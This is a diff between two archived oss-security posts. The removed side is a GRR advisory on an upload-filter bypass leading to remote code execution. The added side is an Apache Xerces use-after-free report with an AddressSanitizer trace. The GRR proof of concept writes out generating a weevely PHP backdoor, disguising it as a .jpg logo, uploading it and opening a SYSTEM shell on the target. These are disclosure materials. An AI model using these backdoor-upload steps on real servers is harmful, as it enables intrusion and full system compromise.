@@ -1,127 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/12/14
-Message-ID: <CAORzZ6Wt3iMV-WKXO7hxp+GmXVS8PVf_yMpd-Z+dgcEY5LmgzA@mail.gmail.com>
-Date: Tue, 12 Jan 2016 20:03:27 +0100
-From: Jean-Marie Bourbon <mail.bourbon@...il.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenficated)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/28/1
+Message-ID: <CAFkTriK-q3LdYd31Wj1VwV5d=Y5Qu=yP4tjpkSOKP2wu-C8XZA@mail.gmail.com>
+Date: Tue, 28 Jun 2016 14:50:14 +0800
+From: Marco Grassi <marco.gra@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: Apache Xerces getLastExtEntityInfo Use-After-Free
 Content-Type: text/plain; charset=utf-8
 
-Hi guys,
+Hi,
 
-I'd like to request a CVE ID for the following security issue.
-
-
-I. APPLICATION
-======================================================================================
+the attached xml will trigger a UAF in xerces-c version 3.1.3 and the trunk
+version
 
 
-GRR is an open source resources manager tool used in many french public
-institutions (not only!).
-It permit for example to manage rooms reservations, and so much more.
+➜  xml cat xerces_uaf | xerces-c-3.1.3/samples/StdInParse
+=================================================================
+==16010==ERROR: AddressSanitizer: heap-use-after-free on address 0xf4a0dfcc
+at pc 0x0836c7f4 bp 0xfff9a198 sp 0xfff9a188
+READ of size 1 at 0xf4a0dfcc thread T0
+    #0 0x836c7f3 in
+xercesc_3_1::ReaderMgr::getLastExtEntityInfo(xercesc_3_1::ReaderMgr::LastExtEntityInfo&)
+const xercesc/internal/ReaderMgr.cpp:833
+    #1 0x83a42d4 in
+xercesc_3_1::XMLScanner::emitError(xercesc_3_1::XMLErrs::Codes,
+xercesc_3_1::XMLExcepts::Codes, unsigned short const*, unsigned short
+const*, unsigned short const*, unsigned short const*)
+xercesc/internal/XMLScanner.cpp:927
+    #2 0x8e40963 in
+xercesc_3_1::IGXMLScanner::scanDocument(xercesc_3_1::InputSource const&)
+xercesc/internal/IGXMLScanner.cpp:276
+    #3 0x84b4cca in xercesc_3_1::SAXParser::parse(xercesc_3_1::InputSource
+const&) xercesc/parsers/SAXParser.cpp:575
+    #4 0x80533d6 in main src/StdInParse/StdInParse.cpp:186
+    #5 0xf6dd5636 in __libc_start_main (/lib32/libc.so.6+0x18636)
+    #6 0x80624f1
+ (/home/bob/VulnResearch/misc/xml/xerces-c-3.1.3/samples/StdInParse+0x80624f1)
 
-Software Link:
-http://grr.devome.com/fr/telechargement/category/3-versions-patch?download=7:grr-3-0-0-rc1
+0xf4a0dfcc is located 44 bytes inside of 56-byte region
+[0xf4a0dfa0,0xf4a0dfd8)
+freed by thread T0 here:
+    #0 0xf7228034 in operator delete(void*)
+(/usr/lib32/libasan.so.3+0xc5034)
+    #1 0x80992df in xercesc_3_1::XMemory::operator delete(void*)
+xercesc/util/XMemory.cpp:89
 
+previously allocated by thread T0 here:
+    #0 0xf72279b4 in operator new(unsigned int)
+(/usr/lib32/libasan.so.3+0xc49b4)
+    #1 0x8357ad9 in xercesc_3_1::MemoryManagerImpl::allocate(unsigned int)
+xercesc/internal/MemoryManagerImpl.cpp:40
+    #2 0x8099042 in xercesc_3_1::XMemory::operator new(unsigned int,
+xercesc_3_1::MemoryManager*) xercesc/util/XMemory.cpp:68
 
-II. ADVISORY
-======================================================================================
-
-
-
-The application allows administrators to change the enterprise's logo
-uploading a new image with .png,.jpg or .gif extension only.
-
-Once uploaded, image name is "splitted" in an array and renamed with the
-name "logo" followed by the extention saved as 2nd array's element.
-
-This file called for example "logo.jpg" is also "chmoded" as 0666
-permission
-and directly accessible in image folder (img_grr by default) by all users.
-
-Besides, the application does only a basic conditional php test
-on the extension of the uploaded file.
-
-It's possible for an attacker to add a second extension that will be
-used when the image will be renamed in order to bypass this basic filter
-(double extension upload filter bypassing).
-
-So, a file called backdoor.php.jpg will be renamed as logo.php with
-chmod 0666 permissions and could be used by attacker to gain more
-privileges
-on the targeted server (privesc due to bad file permissions and RCE).
-
-To trigger this vulnerability it is necessary to have an administrator
-account on the GRR application.
-
-This vulnerability is a combination of 3 issues:
-- predictable uploaded file names and path
-- upload of any kind of file
-- bad files permission when we upload this file that permit us to gain
-privilegied access.
-
-Note that it could be "dorkable" in order to find targets ... and sometimes
-with trivial admin credentials ;-).
-
-
-III. PROOF OF CONCEPT
-======================================================================================
-
-
-Generate backdoor:
-
-    kmkz@...z:~#  weevely generate pass123 /tmp/3lrvs.php
-    Generated backdoor with password 'pass123' in '/tmp/3lrvs.php' of 1486
-byte size.
-    kmkz@...z:~# mv /tmp/3lrvs.php /tmp/3lrvs.php.jpg
-
-
-Login as admin and upload this new 'logo' > Administration > logo
-
-Enjoy your shell!
-
-      kmkz@...z:~# weevely http://laboratoire.target.fr/images/logo.php
-pass123
-    [+] weevely 3.2.0
-
-    [+] Target:    laboratoire.target.fr:F:\server\grr\images
-    [+] Session:    /kmkz/.weevely/sessions/
-laboratoire.target.fr/logo_1.session
-    [+] Shell:    System shell
-
-    [+] Browse the filesystem or execute commands starts the connection
-    [+] to the target. Type :help for more information.
-
-    weevely> whoami
-    autorite nt\system
+SUMMARY: AddressSanitizer: heap-use-after-free
+xercesc/internal/ReaderMgr.cpp:833 in
+xercesc_3_1::ReaderMgr::getLastExtEntityInfo(xercesc_3_1::ReaderMgr::LastExtEntityInfo&)
+const
+Shadow bytes around the buggy address:
+  0x3e941ba0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3e941bb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3e941bc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3e941bd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3e941be0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x3e941bf0: fa fa fa fa fd fd fd fd fd[fd]fd fa fa fa fa fa
+  0x3e941c00: fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00
+  0x3e941c10: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x3e941c20: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
+  0x3e941c30: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
+  0x3e941c40: 00 00 04 fa fa fa fa fa 00 00 00 00 00 00 04 fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==16010==ABORTING
 
 
 
-IV. RISK
-======================================================================================
+Marco
 
-By uploading a script, an attacker may be able to execute arbitrary code
-on the server with elevated privileges.
+https://marcograss.github.io/
 
-This flaw may compromise the integrity of the system
-(with access to sensitive informations, network shares...) and it may
-conduce
-to  full information system's compromission using pivots techniques and
-imagination!
+Content of type "text/html" skipped
 
-
-V. VERSIONS AFFECTED
-======================================================================================
-
-GRR 3.0.0-RC1 is vulnerable (and all previous versions)
-
-
-VI. TIMELINE
-======================================================================================
-
-December 17th, 2015: Vulnerability identification
-January 7th, 2016: Vendor and project developers notification
-January 11th, 2016: Project developers response
-
-@kmkz_security
-
+Download attachment "xerces_uaf" of type "application/octet-stream" (39 bytes)
